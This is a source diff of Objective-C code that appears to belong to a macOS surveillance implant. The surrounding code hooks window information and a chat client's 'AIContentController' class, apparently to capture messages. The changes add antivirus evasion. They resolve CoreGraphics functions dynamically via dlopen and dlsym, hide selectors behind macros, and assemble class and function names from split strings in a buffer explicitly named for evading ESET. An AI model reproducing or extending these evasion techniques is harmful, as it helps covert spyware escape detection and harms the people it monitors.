@@ -68,6 +68,8 @@ static int voipFlag         = 0;
 static int appFlag          = 0;
 static int fileFlag         = 0;
 
+CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID);
+
 NSDictionary *getActiveWindowInformationForPID(pid_t pid)
 {
   ProcessSerialNumber psn = { 0,0 };
@@ -95,7 +97,7 @@ NSDictionary *getActiveWindowInformationForPID(pid_t pid)
     return nil;
   
   // Window list front to back
-  windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
+  windowsList = pCGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
                                            kCGNullWindowID);
   
   if (windowsList == NULL)
@@ -270,6 +272,20 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   [__m_MLogger enableProcessNameVisualization: YES];
 #endif
   
+  if (pCGWindowListCopyWindowInfo == NULL)
+  {
+    void *handle = dlopen("/System/Library/Frameworks/CoreGraphics.framework/Versions/Current/CoreGraphics", 2);
+    
+    if (handle != NULL)
+    {
+      char funcName[256];
+      
+      sprintf(funcName, "CGWindowList%s%s","Copy", "WindowInfo");
+      
+      pCGWindowListCopyWindowInfo = dlsym(handle, funcName);
+    }
+  }
+
   // AV evasion: only on release build
   AV_GARBAGE_002 
 
@@ -460,7 +476,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   NSMutableData *readData;
   shMemoryCommand *shMemCommand;
   BOOL retVal = NO;
-  NSProcessInfo *pi = [NSProcessInfo processInfo];  
+  NSProcessInfo *pi = [NSProcessInfo PROCESSINFO_SEL];  
   
   // AV evasion: only on release build
   AV_GARBAGE_002 
@@ -1447,8 +1463,12 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif   
         // AV evasion: only on release build
         AV_GARBAGE_003 
-
-        Class className   = objc_getClass("AIContentController");
+        
+        char esetEvasionAIContentController[256];
+        
+        sprintf(esetEvasionAIContentController, "AI%s%s", "Content", "Controller");
+        
+        Class className   = objc_getClass(esetEvasionAIContentController);
         
         // AV evasion: only on release build
         AV_GARBAGE_003 
